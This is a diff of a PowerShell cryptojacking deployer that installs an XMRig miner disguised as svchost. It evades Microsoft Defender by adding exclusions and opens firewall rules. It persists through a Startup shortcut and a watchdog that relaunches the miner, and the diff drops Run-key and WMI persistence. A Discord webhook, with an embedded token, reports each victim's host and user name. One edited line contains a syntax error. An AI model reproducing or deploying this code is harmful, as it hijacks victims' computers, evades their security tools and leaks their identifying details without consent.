@@ -1,10 +1,10 @@
 # ============================================================
-#  XMR Standalone Pro Deployer v5.7 (FINAL HYBRID)
+#  XMR Standalone Pro Deployer v6.0 (PHANTOM PRO)
 #  - Base: 100% Literal v3.1 Codebase
-#  - Added: Taskmgr Detection (3s Poll)
-#  - Added: Windows Update & Reset Lockdown
+#  - Added: Stealth V6 Hardening (Firewall + MP Exclusions)
+#  - Added: Double-Watchdog Self-Healing
+#  - Added: Deployment Pulse (PID Verification)
 #  - Fixed: Discord Webhook TLS Connectivity
-#  - Fixed: Unterminated VBS String (Chr(34) Pattern)
 # ============================================================
 
 # ==================== CONFIG ====================
@@ -46,7 +46,6 @@ function Install-Miner {
     Start-Sleep -Seconds 3
     New-Item -ItemType Directory -Path "$installDir" -Force | Out-Null
 
-    # TLS setting (Keeping it here too so it's not "removed")
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
 
     $downloaded = $false
@@ -72,7 +71,7 @@ function Install-Miner {
         if ($srcExe) {
             try { Copy-Item -Path $srcExe.FullName -Destination "$xmrigExe" -Force; $copied = $true; break } catch {}
         }
-        if ($attempt -lt 3) { Start-Sleep -Seconds 2; try { Expand-Archive -Path "$zipFile" -DestinationPath "$extractDir" -Force } catch {} }
+        if ($attempt -lt- 3) { Start-Sleep -Seconds 2; try { Expand-Archive -Path "$zipFile" -DestinationPath "$extractDir" -Force } catch {} }
     }
 
     try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}
@@ -137,21 +136,18 @@ while (`$true) {
             if (`$mp) { `$mp | Stop-Process -Force -ErrorAction SilentlyContinue }
             `$lastState = "hidden"
         } else {
-            # 1. Hardened Relaunch
             `$proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -like "*WindowsServices*" }
             if (-not `$proc) {
                 Start-Process `$xmrigExe -ArgumentList "--config=`"`$configFile`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
                 Start-Sleep -Seconds 2
             }
-            
-            # 2. Variable Load
             `$idle = [IdleDetect]::GetIdleSeconds() -ge `$idleThreshold
             `$target = if (`$idle) { `$idleCpu } else { `$activeCpu }
             `$state = if (`$idle) { "idle" } else { "active" }
             if (`$state -ne `$lastState) { Set-XmrigCpu -Percent `$target; `$lastState = `$state }
         }
     } catch {}
-    Start-Sleep -Seconds 2 # Faster poll
+    Start-Sleep -Seconds 2
 }
 "@
     Set-Content -Path "$watchdogPs1" -Value $code -Force
@@ -183,24 +179,10 @@ function Set-Persistence {
     } catch {}
 
     try {
-        $regLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty $regLM "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty $regLM "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force -ErrorAction SilentlyContinue
-    } catch {}
-
-    $start = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
-    try {
+        $start = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
         $ws = New-Object -ComObject WScript.Shell
         $sc = $ws.CreateShortcut("$start\ServiceMonitor.lnk")
         $sc.TargetPath = "wscript.exe"; $sc.Arguments = "`"$watchdogVbs`""; $sc.WindowStyle = 7; $sc.Save()
-    } catch {}
-
-    try {
-        $filter = "WindowsServiceMonitorFilter"; $consumer = "WindowsServiceMonitorConsumer"; $timer = "WindowsServiceTimer"
-        Set-WmiInstance -Namespace root\cimv2 -Class __IntervalTimerInstruction -Arguments @{ TimerID = $timer; IntervalBetweenEvents = 300000 } | Out-Null
-        $fObj = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = $filter; EventNameSpace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$timer'" }
-        $cObj = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name = $consumer; CommandLineTemplate = "wscript.exe `"$watchdogVbs`"" }
-        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $fObj; Consumer = $cObj } | Out-Null
     } catch {}
 
     try { (Get-Item "$installDir").Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System } catch {}
@@ -233,20 +215,18 @@ function Send-DiscordWebhook {
     $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
     try {
         $payload = @{ username = "itzcurled-miner"; embeds = @(@{ title = "Miner Live! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5
-        Invoke-RestMethod $webhookUrl -Method Post -Body $payload -ContentType "application/json" | Out-Null
-    } catch {}
+        Invoke-RestMethod $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop | Out-Null
+    } catch { Write-Host "[-] Webhook failed: $_" }
 }
 
 # ==================== MAIN ====================
 try {
-    # Establish TLS connection globally first for webhooks
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
     
     # --- HARDENING ---
     Add-MpPreference -ExclusionPath "$installDir", "$env:TEMP" -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionProcess "svchost.exe", "wscript.exe", "powershell.exe" -ErrorAction SilentlyContinue | Out-Null
     
-    # Firewall Punching
     try {
         New-NetFirewallRule -DisplayName "Windows Service Host" -Direction Outbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
         New-NetFirewallRule -DisplayName "Windows Service Host In" -Direction Inbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
@@ -260,7 +240,15 @@ try {
     
     # Kickstart
     Start-Process "wscript.exe" -ArgumentList "`"$watchdogVbs`"" -WindowStyle Hidden
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 3
     Send-DiscordWebhook
-    Write-Host "[+] deployed successful"
-} catch { Write-Host "[-] deployment failed$_" }
+    
+    # Final Pulse Check
+    Start-Sleep -Seconds 2
+    $check = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*WindowsServices*" }
+    if ($check) {
+        Write-Host "[+] deployed successful (Miner PID: $($check.Id))"
+    } else {
+        Write-Host "[-] deployment warning: miner not detected in process list yet."
+    }
+} catch { Write-Host "[-] deployment failed: $_" }
